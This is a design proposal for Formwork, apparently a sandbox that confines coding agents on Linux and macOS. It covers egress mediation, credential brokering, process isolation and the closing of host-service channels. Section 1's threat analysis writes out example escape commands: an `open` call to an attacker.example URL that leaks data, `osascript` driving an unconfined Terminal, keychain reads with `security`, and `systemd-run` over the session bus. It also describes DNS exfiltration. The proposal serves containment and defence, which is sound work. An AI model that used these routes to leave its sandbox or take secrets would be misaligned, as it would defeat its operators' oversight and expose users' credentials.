# FEP-5 (proposal): closing the sandbox gap with meta-harness sandboxes, on Linux and macOS

**Formwork Enhancement Proposal 5 — proposal, not landed.** Companion to `formwork.md` (design +
end-to-end spec), `constitution.md` (doctrine), and `docs/fep-1.md` (host-scoped egress, which this
FEP builds on). Motivated by `docs/omnigent-integration-eval.md`.

**Status: nothing in this document changes the landed spec or the constitution yet.** New
identifiers use draft numbering, written as inline code so the requirements canary skips them.
Numbering starts above the highest landed or drafted number:
- `FW-E2E-074` and `FW-ADV-015` among landed tests;
- `FW-INV12`, drafted in FEP-4;
- `FW-EGR6` and `FW-FID5`, drafted in FEP-1.

Amendments to landed text are written as blocks to apply on landing (§7).

**Platform stance.** Every gap is closed on both backends, or the report states the difference
between them. Each design section has a Linux and a macOS mechanism. §5 is a parity table with one
column per platform, and the requirements (§4) name their backend only where the mechanisms differ.
A macOS claim that has not yet been confirmed on real Seatbelt is marked **(spike)**. It is settled
by the macOS verification spike (§8.1) before the requirement it supports is anchored. Nothing on
either platform is reported `Enforced` from reasoning alone ([FW-INV5](../formwork.md#fw-inv5)).

---

## 1. Problem

Omnigent's OS sandbox is called OmniBox. It uses bubblewrap on Linux, `sandbox-exec` with
`(deny default)` on macOS, and a mandatory L7 egress proxy. `docs/omnigent-integration-eval.md`
compares it with Formwork; each system covers much of what the other lacks.

Formwork leads on the capability model:
- the credential floor under broad grants;
- the exec allowlist;
- tamper-vector write-subtract;
- the split between create and modify;
- the FidelityReport, `explain` and `learn`;
- MCP shading.

The gaps below cover both platforms. Rows G7 and G8 were found while working through macOS for this
revision. They affect Linux as well.

| # | Gap | Omnigent Linux | Omnigent macOS | Formwork Linux today | Formwork macOS today |
|---|---|---|---|---|---|
| G1 | Mandatory egress, allowlisted by **host, method and path** | netns + proxy | SBPL allows only `localhost:<relay>` | `Deny` / `Ports` only | `Deny` / `Ports` only |
| G2 | **Credential injection**: the agent never holds the token | Proxy injects `Authorization` | Same | Deny or expose ([FW-CRED5](../formwork.md#fw-cred5)) | Same |
| G3 | **UDP** closed | Closed (netns) | Closed (`deny default`) | Open under `Ports`, and the report doesn't say so | Closed (`deny network*`) |
| G4 | **Pathname AF_UNIX** sockets (Docker, ssh-agent, session bus) | Not mounted, so unreachable | Denied except the relay | `connect()` not mediated | Closed except the resolver literal |
| G5 | **Process isolation**: other processes' PIDs and `/proc`, IPC, a private `/tmp` | Namespaces | Signal and `process-info` limited to self; no namespaces | None; shared `/tmp` | None; shared `/tmp` and `$DARWIN_USER_TEMP_DIR` |
| G6 | **Privileged kernel interfaces**: IOKit, `mach-priv*` | Not applicable (seccomp) | Not granted | Anti-shedding baseline ([FW-ISO8](../formwork.md#fw-iso8)) | Allowed: `(allow default)` has no baseline |
| G7 | **Host-service channels**: a service outside the sandbox that runs code, opens URLs, or releases secrets for the confined process | Closed: `$XDG_RUNTIME_DIR` is private and `DBUS_*` is stripped | AppleEvents and LaunchServices are presumed closed by `(deny default)` **(spike)**; every `mach-lookup` is allowed (pasteboard, keychain, launchd) | Open: session bus, `systemd --user`, X11 and Wayland sockets are reachable (see G4) | Open: `(allow default)` allows `appleevent-send`, `lsopen` and every `mach-lookup` |
| G8 | **Other processes' arguments and environment** | Hidden (PID namespace) | Readable through `sysctl` `kern.procargs2`: `sysctl-read` is allowed **(spike)** | `/proc/<pid>/cmdline` readable; `environ` is blocked by Landlock (verified) | Readable through `kern.procargs2`, which includes the **environment** of same-uid processes **(spike)** |

**G7 is the largest gap on either platform.** A confined process that can reach a host service which
acts on its behalf leaves the sandbox without breaking anything in it. The examples below are what
`(allow default)` or an unmediated socket permits; the §8.1 spike confirms each.
- **macOS:**
  - `open 'https://attacker.example/?d=…'` asks LaunchServices to start the browser *outside* the
    sandbox, which is an egress bypass.
  - `osascript -e 'tell application "Terminal" to do script "…"'` runs a command in an unconfined
    shell.
  - `pbpaste` reads the clipboard.
  - `security find-generic-password -w` reads keychain items whose access list does not prompt.
- **Linux, where a user session runs:**
  - `systemd-run --user sh -c …` over the session bus runs unconfined.
  - `xdg-open` is the LaunchServices equivalent.
  - The Secret Service API is the keychain equivalent.
  - An X11 or Wayland socket gives the clipboard and input injection.

Container and CI hosts usually run no user session, which is why the Linux side of the evaluation did
not show this gap.

This FEP closes G1–G8 within the closed concept list:
- **G1, G3, G4:**
  - On Linux, one mechanism covers all three: a `connect()` supervisor, which is the on-demand
    form of fd minting ([FW-GW6](../formwork.md#fw-gw6)).
  - On macOS, the three are static SBPL rules.
- **G2** extends the Catalog and the Gateway. It works the same on both platforms, apart from one
  difference in client trust stores (§3.2).
- **G5 and G8** are an optional Confiner tier on Linux, and Seatbelt target and sysctl filters on
  macOS.
- **G6 and G7** extend the anti-shedding baseline ([FW-ISO8](../formwork.md#fw-iso8)) to both
  backends, and extend the Catalog with credential locations that are services rather than paths.

The defects the evaluation found come first as Phase 0 (§2). Two of them block the default profile
on Linux, and two make the macOS report claim more than it enforces.

### 1.1 Constraints this FEP holds to

- **No new concept.**
  - The supervisor is the Gateway minting fds over the Seam.
  - Brokering is the Catalog plus the Gateway.
  - The namespace tier and the host-service baseline are Confiner mechanisms.
- **Kernel-first transport.** The confined process never gets network access around the Gateway
  ([FW-XR7](../formwork.md#fw-xr7)). Proxy environment variables help clients find the Gateway;
  they are never what enforces the boundary.
- **Honesty.** Each new capability has a FidelityReport line per backend. A tier that the host
  cannot provide is reported `Unenforceable`, and a blueprint that requests it fails loudly, never
  silently.
- **Growth.** Every new dependency and blueprint field is justified in §6. TLS termination is opt-in
  per host, not the default egress path.
- **Transparency ([FW-TRA2](../formwork.md#fw-tra2)).** The macOS base stays `(allow default)`. G6
  and G7 are closed by named denies, each checked against real toolchains
  ([FW-E2E-020](../formwork.md#fw-e2e-020)..023). The alternative, a `(deny default)` base, is
  recorded in §8 and not proposed.

---

## 2. Phase 0 — defects (bug fixes, no Concepts amendment)

Each defect is a fix to an existing requirement's implementation or to its report, so none needs a
new ID.

| # | Platform | Defect | Violates | Proposed fix |
|---|---|---|---|---|
| D1 | Linux | `extends = ["builtin:default"]` fails at enforce time: `any-depth pattern **/.git/config cannot be a rooted Landlock rule`. The compiler passes `write-subtract` `**/` rows through unfiltered (`formwork-compile/src/lib.rs:440`), while it withholds the floor's `**/` rows (`:432`). | [FW-INV5](../formwork.md#fw-inv5): the report says fs-write is `Enforced`, then the install fails | Withhold these rows the same way as floor rows, and report the tamper-vector set `Partial` with the reason. Add an E2E test that runs `builtin:default` under real Landlock; none exists today. |
| D2 | Linux | `formwork explain $CWD/sub/.env` answers "denied (credential floor)", but the file is readable | [FW-INV5](../formwork.md#fw-inv5) | `explain` shows the per-platform verdict for any-depth rows ("withheld on this host") next to the model verdict |
| D3 | Linux | New files cannot be created in a "split" directory. `protect_policy_inputs` write-denies `FORMWORK.toml` and its siblings, so the project root is always split. | [FW-TRA1](../formwork.md#fw-tra1) reuse | Move the discovery artifacts to a per-blueprint directory under `$XDG_STATE_HOME/formwork/`; on macOS, `~/Library/Application Support/formwork/`, keeping the two platforms the same shape. Report create-in-split-directory as `Partial` for the holes that remain. |
| D4 | Linux | Under `Ports`, UDP is unrestricted, but the report says `net-default-deny enforced` | [FW-INV5](../formwork.md#fw-inv5), [FW-ISO5](../formwork.md#fw-iso5) | Report `Partial: UDP unrestricted under the port tier` now. Phase 2 enforces it (`FW-ISO11`). On macOS UDP is already closed; the report says so explicitly. |
| D5 | Linux | The CrossDomainSocket `Partial` reason does not say that pathname `connect()` is unmediated. That includes the session bus and `systemd --user` sockets, so the gap is an escape route (G7), not just a disclosure. | [FW-INV5](../formwork.md#fw-inv5) | Reword the reason and name the escape route. Phase 2 enforces it (`FW-ISO12`). As an interim measure, the default env scrub strips `DBUS_SESSION_BUS_ADDRESS`, `DISPLAY` and `WAYLAND_DISPLAY`. This only slows discovery, since the socket paths are well known, so the report stays `Partial`. |
| D6 | both | The Gateway forwards some frames unfiltered: non-JSON frames, JSON-RPC batch arrays, and `tools/call` / `resources/read` / `prompts/get` without an `id` | [FW-GW2](../formwork.md#fw-gw2), [FW-GW4](../formwork.md#fw-gw4) | Close the connection on a non-JSON frame (fail closed). Refuse batch arrays; MCP 2025-06-18 removed batching. Check a gated method against policy whether or not it has an `id`, and drop it if ungranted. Test: `FW-ADV-016`. |
| D7 | macOS | The report has no line for host-service channels or privileged kernel interfaces, although `(allow default)` leaves AppleEvents, LaunchServices, every mach service and IOKit reachable | [FW-INV5](../formwork.md#fw-inv5), [FW-XR1](../formwork.md#fw-xr1) | Add report lines `host-service channels: Unenforceable` and `privileged kernel interfaces: Unenforceable` now. Phase 1 closes them (`FW-ISO13`, `FW-ISO14`). |
| D8 | macOS | The port tier re-allows `(remote tcp "*:port")` together with the mDNSResponder literal. The resolver is a DNS exfiltration channel: a name lookup reaches an authoritative server the attacker controls. The report does not list it. | [FW-INV5](../formwork.md#fw-inv5) | Report it under the port tier: `DNS lookups reach any resolver-visible name`. Under `AllowHosts` the literal is dropped (`FW-EGR12`). |

---

## 3. Design

### 3.1 Egress transport (G1, G3, G4)

FEP-1 specifies *what* host-scoped egress permits. It leaves open how an unmodified HTTP client —
`node`, `curl`, `git`, `pip` — reaches the Gateway when all it holds is an inherited fd. Clients
need a TCP endpoint, and each platform has to guarantee that this endpoint is the only one the
confined process can reach.

**Linux: seccomp user notification.**

Under the `AllowHosts` posture, the Confiner installs a seccomp filter that returns
`SECCOMP_RET_USER_NOTIF` for `connect()` on AF_INET, AF_INET6 and AF_UNIX sockets. The listener fd
goes to the spawning `formwork` process over the spawn socketpair. That process sits outside the
sandbox and acts as the supervisor, a Gateway component. For each notification the supervisor:
1. copies the `sockaddr` out of the target and validates the notification id
   (`SECCOMP_IOCTL_NOTIF_ID_VALID`);
2. decides using its own copy;
3. if the decision is allow:
   - opens a TCP socket to the Gateway's egress listener;
   - registers that socket's local port with the Gateway as an authenticated seam connection;
   - installs the socket in place of the target's fd with `SECCOMP_IOCTL_NOTIF_ADDFD` +
     `SECCOMP_ADDFD_FLAG_SETFD`, and returns 0;
4. otherwise returns `EACCES` and emits a violation record ([FW-FID5](fep-1.md#fw-fid5)).

The kernel never re-reads the target's buffer and the target never completes a connection. The
decision uses a copy and the supervisor performs the action, so the time-of-check/time-of-use
weakness of user notification with pointer arguments does not apply.

The same filter covers the other network paths:
- It denies `SOCK_DGRAM` sockets on AF_INET/6 at `socket()`.
- It denies `sendto`/`sendmsg` with a non-null address on a stream socket (TCP Fast Open).

Pathname AF_UNIX sockets (G4, G7) follow the same flow:
1. The supervisor resolves `sun_path` against the target's `/proc/<pid>/root` and `cwd`, opening it
   `O_PATH` on its own side.
2. It allows the connect if the socket is granted (§3.1.1) or was bound inside the session.
3. If allowed, it connects through `/proc/self/fd/<n>` and injects the result. Otherwise it returns
   `EACCES`.

With this in place, the session bus, `systemd --user`, X11, Wayland, the nscd socket and the
systemd-resolved sockets are all denied unless a rule grants them.

The Gateway's egress listener accepts a connection only if the supervisor registered its source
port. A co-resident process that connects without registration is refused, which is the
authenticated-by-construction path that [FW-EGR6](fep-1.md#fw-egr6) requires; no proxy token is
needed.

Kernel requirements and posture:
- `NOTIF_ADDFD` with `SETFD` needs Linux 5.9 or later. That is below the Landlock ABI 4 floor (6.7)
  that the port tier already requires.
- Under `confine-self` there is no process outside the sandbox to act as supervisor. In that posture
  `AllowHosts` is `Unenforceable` and fails loudly when requested.
- The *optional namespace path* is an alternative: with unprivileged user namespaces and the §3.3
  tier, the session gets a network namespace containing only `lo`, with the relay inside it on the
  Seam. This is Omnigent's design. The supervisor stays the default because it needs no user
  namespace, and bubblewrap fails where user namespaces are missing (Docker's default seccomp
  profile; distributions that restrict them through AppArmor).

**macOS: static SBPL, with an authenticated local endpoint.**

- **Egress endpoint.**
  - Under `AllowHosts`, the policy keeps `(deny network*)` and re-allows exactly
    `(allow network-outbound (remote tcp "localhost:<P>"))`, where `P` is the Gateway's egress
    listener for this session.
  - SBPL remote-address filters accept only `*` or `localhost` as the host **(spike)**. Seatbelt
    therefore cannot express "one local endpoint, and only for this session", and the listener has
    to authenticate the connection itself.
- **Authentication, with two layers:**
  1. A per-session proxy credential that the Launcher delivers inside `HTTP(S)_PROXY`
     (`http://fw:<nonce>@127.0.0.1:<P>`). The Gateway requires it on every CONNECT and request.
  2. A peer-process check. On accept, the Gateway maps the loopback 4-tuple to its owning PID
     (`proc_pidfdinfo` / `PROC_PIDFDSOCKETINFO`), checks that the PID belongs to the session, and
     refuses otherwise.
     - Session membership is tracked from the spawn root with `proc_pidinfo` ancestry, plus a
       record of processes that have been reparented.
     - If the owning PID cannot be determined, the connection is refused (fail closed).
- **Resulting verdict.** Together these bring [FW-EGR6](fep-1.md#fw-egr6) to `Enforced` on macOS
  if the spike confirms that the peer lookup is reliable under load **(spike)**. Otherwise macOS
  reports `Partial`, with the residual stated: a same-uid process that can read the agent's
  environment could present the credential.
- **Sealing the other routes:**
  - **UDP** is closed by `(deny network*)`.
  - **Pathname AF_UNIX** is closed by the same deny, except for granted literals (§3.1.1). This is
    already `Enforced` on macOS.
  - **DNS:** under `AllowHosts` the mDNSResponder literal is dropped. HTTP clients that use a proxy
    do not resolve names locally, so every lookup happens in the Gateway, which pins it
    ([FW-ADV-008](fep-1.md#fw-adv-008)).
  - **Other routes out:** G7 (§3.4) closes LaunchServices, AppleEvents and launchd, so the network
    policy cannot be bypassed by handing a URL or a command to an unconfined process.
- **`confine-self` on macOS.** The SBPL policy itself applies under either posture, but the Gateway
  must run outside the sandbox. Under `confine-self`, `AllowHosts` therefore requires a Gateway that
  was started separately (`--gateway <socket>`). Without one it is `Unenforceable`, matching Linux.
- **Violations.** macOS gets no per-connection notification, so there is nothing like the Linux
  supervisor's per-`connect()` record. Seatbelt denials reach [FW-FID5](fep-1.md#fw-fid5) through
  the unified-log tap. That tap exists (`learn` uses it) but runs after the fact. The report marks
  macOS violation latency accordingly.

#### 3.1.1 Granting a unix socket

A session that needs a socket (for example `SSH_AUTH_SOCK`, for a `git push` the operator wants)
names it with the existing `allow` path verb on the socket path. No new verb is added (Growth). For
socket files, `allow` gains the meaning "connect", and `explain` shows it.
- **Linux:** the supervisor admits the socket.
- **macOS:** the compiler emits `(allow network-outbound (literal "<path>"))`.
- **Catalog:** entries whose env var names a socket (ssh-agent) stay floor-denied unless excluded
  ([FW-CRED5](../formwork.md#fw-cred5)), on both platforms.

### 3.2 Inspection and credential brokering (G1 method/path, G2)

FEP-1 declares TLS interception and credential masking non-goals, to be revisited "only if a
concrete requirement demands request-body policy". Two such requirements now exist:
- **Path-scoped writes.** For example, `POST api.github.com/repos/acme/**` but not other orgs. SNI
  or CONNECT scoping lets any repo on the host be written.
- **Credential brokering.** This is the open question in `formwork.md` §11, and the catalog is now
  shaped to answer it.

This FEP adds an **inspected** host grade, opt-in per host. The CONNECT/SNI grade from FEP-1 stays
the default for plain host grants, and stays `Partial` per [FW-EGR5](fep-1.md#fw-egr5). The Gateway
is userland Rust, so inspection and brokering behave the same on both platforms; the one difference
is which clients trust the session CA (below).

**Inspected hosts.**
- A host rule that carries `methods`, `paths`, or a brokered credential is inspected. For such a
  host the Gateway:
  - terminates TLS with a leaf certificate minted for the SNI;
  - checks the SNI against the CONNECT target and the `Host` header;
  - evaluates the request line against the rule;
  - sends the request upstream with the host's trust store.
- Host identity is `Enforced` for inspected hosts, because SNI, `Host` and the upstream certificate
  are checked against each other.
- **Request canonicalization before matching:**
  - percent-decode unreserved characters, then remove dot-segments (RFC 3986 §5.2.4);
  - reject an encoded `/` (`%2F`), NUL, backslash, and `Content-Length` together with
    `Transfer-Encoding`;
  - match the path without the query string.

  Omnigent's matcher does not canonicalize: `/repos/acme/../other/x` matches `/repos/acme/**`
  (verified against `omnigent/inner/egress/rules.py`). `FW-ADV-017` tests that case.
- Inspected connections negotiate HTTP/1.1 through ALPN. HTTP/2 is an open question (§8).

**CA and client trust.**
- **The CA:**
  - It is generated in memory per session, and the private key never touches disk. Omnigent caches
    its key under `~/.cache`.
  - The certificate, concatenated with the host bundle, is written read-only into the session
    scratch.
  - The Launcher points `SSL_CERT_FILE`, `NODE_EXTRA_CA_CERTS`, `REQUESTS_CA_BUNDLE`,
    `CURL_CA_BUNDLE`, `GIT_SSL_CAINFO` and `PIP_CERT` at it.
  - A client that pins certificates, or ignores these variables, fails the handshake: fail closed.
- **Linux:** OpenSSL, BoringSSL, rustls-native-certs, Node, Python and Go all honor these variables.
- **macOS asymmetry:** clients that verify through Security.framework ignore them. That includes Go
  (whose `crypto/x509` uses the platform verifier on darwin; `gh` is a Go program), Swift
  `URLSession`, and Apple-built tools.
  - Such clients fail closed against an inspected host.
  - Adding the session CA to a keychain in the user's search list would change trust for the whole
    host, so it is excluded.
  - Result: inspection is `Enforced` for clients that honor the environment variables and
    `Unenforceable` (fail-closed) for platform-verifier clients. The per-host report line names this
    on macOS.
  - Open question §8: per-process trust on macOS.
  - Plain CONNECT/SNI host grants are unaffected, because no certificate is minted for them.

**Brokering.**

Catalog changes:
- A catalog entry gains an optional `broker` block with two fields:
  - `hosts`: the hosts the credential may be presented to.
  - `scheme`: `bearer`, `basic`, or `header:<name>`. Anthropic uses `x-api-key`, which Omnigent's
    `Authorization`-only injector cannot express.
- The credential's source is the entry's existing env var or file.

Blueprint side:
- A blueprint lists `broker-credentials = ["github", "anthropic"]`. For each listed type:
  - **The floor is unchanged.** The Launcher still strips the variable and the Confiner still denies
    the file, so the bytes never enter the sandbox.
  - **The Gateway** reads the source at session start, and again on the stated refresh interval.
  - **A placeholder.** The Launcher sets the catalog env var to a random value,
    `fwcred_<type>_<nonce>`, so that clients that refuse to start without the variable still run.
  - **Header rewriting.** On an inspected request to a bound host, the Gateway replaces the
    placeholder in the scheme's header, or adds the header if it is absent.
  - **Other hosts.** A placeholder sent to any other host is refused with a violation record.
- Brokering a type makes its bound hosts inspected. The compiler rejects a brokered type whose hosts
  are missing from the allowlist, and fails loudly at compile time.
- On macOS, a brokered type whose common client uses the platform verifier (for example `github`
  with `gh`) gets a report line saying so. The operator can then pair it with an HTTP client that
  honors the environment, or with the git credential path (`git` honors `GIT_SSL_CAINFO` on both
  platforms).
- Out of scope, and recorded in §8:
  - request-signing schemes (AWS SigV4, GCP service-account JWT minting), which need a signer rather
    than a header;
  - SSH agent forwarding.

### 3.3 Process isolation (G5, G8)

Both platforms offer an opt-in `isolate` tier (§6). It is opt-in because isolating processes changes
what `ps`, debuggers and IDE bridges see, and transparency is the default. The tier's members are the
same everywhere — `pid`, `ipc`, `tmp`, `procargs` — and each maps to a mechanism per platform.

**Linux, with unprivileged user namespaces.**
- **Namespaces:** the confined child enters new user (uid and gid mapped to themselves), PID, IPC,
  UTS and mount namespaces.
- **Order:** this happens before Landlock and seccomp are installed. Afterwards the seccomp baseline
  still denies `CLONE_NEWUSER` and the mount family ([FW-ISO8](../formwork.md#fw-iso8)).
- **Mounts:** a fresh `procfs` on `/proc`, which gives G8, and a `tmpfs` on `/tmp`.
- **Filesystem view:** no other mount changes. The file view stays the host's, so paths are
  unchanged, and Landlock remains the file boundary.
- **PID 1:** a minimal init owned by Formwork reaps children and forwards signals. The agent is its
  child.
- **Without user namespaces:**
  - `pid`, `ipc` and `procargs` are `Unenforceable`, and requesting them fails loudly
    ([FW-INV6](../formwork.md#fw-inv6)).
  - `tmp` falls back to the directory-based form described below.

**macOS, where there are no namespaces, so the tier is built from Seatbelt filters:**
- **`pid`:**
  - `(deny process-info* (target others))` and `(deny signal (target others))`, with a re-allow for
    the session's own processes (`(target children)`, and same-sandbox **(spike)**);
  - denies on `sysctl-read` for the process-enumeration MIBs (`kern.proc.*`) **(spike)**.
  - If the spike shows that `ps` can still list processes outside the session, `pid` is reported
    `Partial` on macOS, with the list of what remains visible.
- **`procargs`:** `(deny sysctl-read (sysctl-name "kern.procargs2"))`, together with the `pid`
  target filters. This closes G8, where macOS is currently *weaker* than Linux: `kern.procargs2`
  returns the environment of same-uid processes, not only their arguments **(spike)**. Linux already
  blocks `environ` through Landlock. Because this is a credential-disclosure path, the
  `kern.procargs2` deny is proposed for the **default** profile on macOS, independent of `isolate`
  (`FW-ISO16`).
- **`ipc`:**
  - Deny `ipc-sysv-*`.
  - Restrict `ipc-posix-shm*` and `ipc-posix-sem*` to names carrying a session prefix **(spike)**.
  - POSIX IPC names are global, so this is reported `Partial`: a process outside the session that
    uses an unprefixed name remains reachable only if both sides pick the same name.
- **`tmp`:** the directory-based form below. The shared per-user `$DARWIN_USER_TEMP_DIR`
  (`confstr(_CS_DARWIN_USER_TEMP_DIR)`, under `/private/var/folders`) is write-denied except for the
  session's subdirectory. Tools that call `confstr` rather than reading `TMPDIR` then fail loudly
  instead of leaking.

**The directory-based `tmp` form (both platforms, and the Linux fallback).** The Launcher creates a
per-session directory, sets `TMPDIR`/`TMP`/`TEMP`, and grants writes there instead of to `/tmp/**`
(and, on macOS, `/private/tmp/**` and `$DARWIN_USER_TEMP_DIR/**`). It is reported `Partial`: tools
that hardcode `/tmp` fail rather than share.

**Stacked under Omnigent's bwrap** (evaluation Option B), the outer layer already provides the Linux
tier, and the blueprint leaves `isolate` unset.

### 3.4 Host-service channels and privileged interfaces (G6, G7)

This extends the anti-shedding baseline ([FW-ISO8](../formwork.md#fw-iso8)). On Linux it covers
syscalls that shed confinement; this FEP makes it cover services that act *on the process's behalf
outside it*, on both platforms. The baseline is part of every blueprint, like the seccomp baseline.
Individual channels are lifted through the Catalog's typed exclusion
([FW-CRED5](../formwork.md#fw-cred5)) where a channel is a credential (keychain, Secret Service). The
remaining channels are lifted with the `allow` verb on the channel's name, visible in `explain`.

| Channel class | macOS mechanism (SBPL deny) | Linux mechanism | Lift |
|---|---|---|---|
| Run code outside the sandbox | `appleevent-send` (all targets); `mach-lookup` for launchd job submission and `com.apple.coreservices.appleevents` **(spike: exact service names)** | The supervisor denies the session bus and `systemd --user` sockets (`FW-ISO12`); `DBUS_*` stripped | `allow` on the target (e.g. a named AppleEvent target) |
| Open URLs or documents outside the sandbox | `lsopen`; `mach-lookup` `com.apple.coreservices.launchservicesd`, `com.apple.lsd.*` **(spike)** | Session bus (portal, `xdg-open`) | `allow` |
| Clipboard | `mach-lookup` `com.apple.pasteboard.*` | X11/Wayland sockets (`FW-ISO12`); abstract X11 is already scoped by Landlock ABI 6 | `allow` |
| Secret stores | `mach-lookup` `com.apple.SecurityServer`, `com.apple.securityd*`, keychain file paths **(spike)** | Session bus (Secret Service / gnome-keyring / KWallet), `$XDG_RUNTIME_DIR/keyring/*` | Catalog types `macos-keychain` and `secret-service` ([FW-CRED5](../formwork.md#fw-cred5)); `git`'s `osxkeychain` helper needs the first |
| Screen and input capture | `mach-lookup` WindowServer/screencapture services; `iokit-open` for HID | X11/Wayland sockets | `allow` |
| Camera, microphone | `iokit-open` (camera and audio classes); `mach-lookup` `com.apple.cmio.*`, `com.apple.audio.*` | `/dev/video*`, `/dev/snd/*` are not in the essentials and are denied in `closed` mode; in ambient mode they are denied by a default subtract | `allow` |
| Privileged kernel ports | `mach-priv-host-port`, `mach-priv-task-port` | Covered by seccomp (`ptrace`, `process_vm_*`) | none |

Two notes on the table:
- **TCC.** macOS attributes a child's privacy-sensitive access to the responsible app (Terminal,
  iTerm, the IDE). If the user granted that app Full Disk Access, Camera or Screen Recording, a
  confined agent can use the grant. Seatbelt still bounds file access, but the camera, screen and
  input rows above are how Formwork stops the agent from riding on those grants.
- **`iokit-open`.** It is denied except for the classes the transparency spike finds developer
  toolchains need. If that set is too broad to mean anything, the IOKit rows ship in the `strict`
  profile only, and the default profile reports them `Partial`.

### 3.5 What stays asymmetric

These differences remain after this FEP. The report states each one; none is hidden.

| Property | Linux | macOS | Why |
|---|---|---|---|
| Violation latency | Per-`connect()`, synchronous (supervisor) | Delayed, from the unified log | Seatbelt has no notification channel |
| Egress endpoint authentication | By construction (registered source port) | Credential + peer-PID check | SBPL cannot scope `localhost` to a session |
| TLS inspection coverage | All clients that honor env-var trust stores | Excludes Security.framework clients | No per-process trust injection on macOS |
| Any-depth `**/` rows | `Partial` (Landlock cannot root them) | `Enforced` (regex) | Kernel mechanism |
| stat on denied paths | `Partial` (stat residual) | `Enforced` (metadata deny) | Kernel mechanism |
| Process isolation | Namespaces, `Enforced` where user namespaces exist | Target/sysctl filters, `Partial` or `Enforced` per the spike | No namespaces on macOS |
| Private `/tmp` | tmpfs (tier) or directory-based (`Partial`) | Directory-based (`Partial`) | No mount namespace on macOS |
| ENOENT invisibility | Not provided | Not provided | `formwork.md` §3 non-goal |
| Enforcement API | Landlock/seccomp are stable kernel ABI | `sandbox_init` is deprecated but still shipped; Chromium, Codex and `sandbox-runtime` depend on it | See §8 |

---

## 4. Proposed requirements (draft numbering — anchored on landing)

These continue existing families (EGR, ISO, CRED, FID). No new family is added.

| Req | Requirement |
|---|---|
| `FW-EGR7` **Supervised connect (Linux)** | Under the host-allowlist posture on Linux, the Confiner shall deliver every `connect()` on AF_INET, AF_INET6 and AF_UNIX sockets to a supervisor outside the sandbox. The supervisor shall perform any allowed connection itself and install the result in the target, so that no confined process completes a `connect()` of its own. |
| `FW-EGR8` **Sole egress endpoint (macOS)** | Under the host-allowlist posture on macOS, the compiled profile shall permit outbound network to exactly `localhost:<P>` for the session's Gateway listener and to the pathname sockets granted by `allow`, and to nothing else. |
| `FW-EGR9` **Registered egress** | The Gateway egress listener shall accept a connection only if its source endpoint was registered by the supervisor (Linux), or if the connection presents the session's proxy credential *and* its peer PID belongs to the session (macOS). |
| `FW-EGR10` **Inspected host rule** | For a host rule that names `methods`, `paths` or a brokered credential, the Gateway shall terminate TLS, verify that the SNI, `Host` header and CONNECT target agree, and admit a request only if its method and canonicalized path (`FW-EGR11`) match the rule. |
| `FW-EGR11` **Request canonicalization** | Before matching, the Gateway shall remove dot-segments, decode percent-encoded unreserved characters, and reject a request containing an encoded `/`, a NUL, a backslash in the path, or both `Content-Length` and `Transfer-Encoding`. |
| `FW-EGR12` **Resolver closure** | Under the host-allowlist posture, the Confiner shall deny the confined process every local name-resolution path: UDP (Linux, `FW-ISO11`), the resolver sockets (nscd and systemd-resolved on Linux, through `FW-ISO12`; the mDNSResponder literal on macOS). |
| `FW-EGR13` **Ephemeral CA** | The Gateway shall generate the inspection CA in memory per session. It shall not write the CA private key to any file, nor expose it to any confined process. |
| `FW-CRED10` **Brokered credential** | For each type in `broker-credentials`, the Launcher shall strip the type's env var and the Confiner shall deny its locations exactly as for an unlisted type ([FW-CRED4](../formwork.md#fw-cred4)). The Gateway shall hold the credential outside the sandbox. |
| `FW-CRED11` **Placeholder binding** | When a brokered type has an env var, the Launcher shall set it to a per-session placeholder. The Gateway shall substitute the placeholder only in requests to that type's bound hosts, and refuse, with a violation record, any request carrying it to another host. |
| `FW-CRED12` **Broker host closure** | The compiler shall reject a blueprint that brokers a type whose bound hosts are absent from the host allowlist. |
| `FW-CRED13` **Service-located credentials** | The Catalog shall express credential locations that are services rather than paths: macOS mach service names and Linux session-bus names or sockets. It shall ship the `macos-keychain` and `secret-service` types, floor-denied by default. |
| `FW-ISO10` **Process-isolation tier** | When a blueprint requests `isolate`, the Confiner shall apply each requested member (`pid`, `ipc`, `tmp`, `procargs`) with the platform mechanism in §3.3. It shall fail loudly for any member the host cannot provide at the requested verdict. |
| `FW-ISO11` **UDP closure (Linux)** | Under the host-allowlist posture, the Confiner shall deny AF_INET and AF_INET6 `SOCK_DGRAM` socket creation. Under the port posture, the FidelityReport shall mark UDP unrestricted. |
| `FW-ISO12` **Pathname socket mediation (Linux)** | Under supervised connect, the supervisor shall refuse a `connect()` to a pathname AF_UNIX socket unless the socket path is granted by an `allow` rule or was bound by a process in the session. |
| `FW-ISO13` **Host-service baseline (macOS)** | The macOS profile shall deny, in every blueprint, `appleevent-send`, `lsopen`, and `mach-lookup` of the service names in the §3.4 channel table, unless a blueprint lifts a named channel. |
| `FW-ISO14` **Privileged-interface baseline (macOS)** | The macOS profile shall deny `mach-priv-host-port`, `mach-priv-task-port`, and `iokit-open` except for the IOKit classes in the shipped allowlist. |
| `FW-ISO15` **Host-service baseline (Linux)** | In every blueprint, the Launcher shall strip `DBUS_SESSION_BUS_ADDRESS`, `DISPLAY` and `WAYLAND_DISPLAY`. Under supervised connect, the supervisor shall refuse the session-bus, `systemd --user`, X11 and Wayland sockets unless a blueprint lifts a named channel. Without supervised connect, the FidelityReport shall mark host-service channels `Partial`. |
| `FW-ISO16` **Process-environment disclosure** | The Confiner shall deny a confined process reading the environment of any process outside the session: Landlock domain scoping on Linux (verified today), and a `kern.procargs2` `sysctl-read` deny on macOS in every blueprint. |
| `FW-FID8` **Per-backend report lines** | The FidelityReport shall carry separate verdicts, per backend, for host scoping, inspection (with the macOS client-trust caveat), UDP, pathname socket mediation, resolver closure, brokering, each `isolate` member, host-service channels, and privileged interfaces. |

Invariants:

- `FW-INV13` **Broker non-disclosure.** No brokered credential's bytes appear in a confined process's
  environment, in a file or service it can read, or in any response the Gateway returns to it. Tested
  on both backends.
- `FW-INV14` **No out-of-sandbox execution.** A confined process cannot cause a process outside the
  session to execute a command, open a URL, or perform network egress on its behalf through any
  channel in §3.4 that the blueprint has not lifted. Tested on both backends.

Tests (draft). Each test runs on both backends unless it is marked with one. Mechanism-specific
steps are noted inline.

- `FW-E2E-075` **Sole egress path.** Under `AllowHosts(["allowed.test"])`:
  - a request through `HTTP_PROXY` reaches the fixture;
  - each of these fails, with a violation record:
    - a direct `connect()` to the fixture address, to `169.254.169.254`, and to the Gateway listener
      without registration (Linux) or without the credential (macOS);
    - UDP `socket()` (Linux) or UDP `sendto` (macOS);
    - `getaddrinfo("blocked.test")`.
- `FW-E2E-076` **Pathname socket.** A socket bound by a host process outside the session is refused.
